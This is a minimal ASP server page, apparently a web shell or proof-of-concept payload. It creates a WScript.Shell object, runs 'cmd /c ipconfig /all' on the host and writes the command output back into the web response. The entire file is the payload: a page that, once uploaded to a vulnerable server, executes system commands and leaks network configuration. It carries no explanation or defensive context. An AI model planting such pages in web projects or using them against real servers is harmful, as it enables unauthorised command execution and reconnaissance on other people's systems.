<%
Dim rs = CreateObject("WScript.Shell")
Dim cmd = rs.Exec("cmd /c ipconfig /all")
Dim o = cmd.StdOut.Readall()
Response.write(o)
%>
